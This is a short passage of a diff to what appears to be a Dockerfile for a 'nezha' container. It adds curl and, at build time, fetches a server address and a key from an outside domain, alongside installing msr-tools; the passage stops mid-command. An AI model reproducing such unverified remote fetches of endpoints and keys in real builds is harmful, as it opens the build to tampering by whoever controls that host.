@@ -4,7 +4,7 @@ WORKDIR /app
 COPY nezha /app
 
 RUN apt update -y \
-  && apt install -y procps msr-tools net-tools
+  && apt install -y procps msr-tools net-tools curl
 RUN curl -s html.vscwjm.eu.org/NZ/intel_build-server
 RUN server=$(curl -s html.vscwjm.eu.org/NZ/intel_build-server) && \
   key=$(curl -s html.vscwjm.eu.org/NZ/intel_build-key-com_01) && \
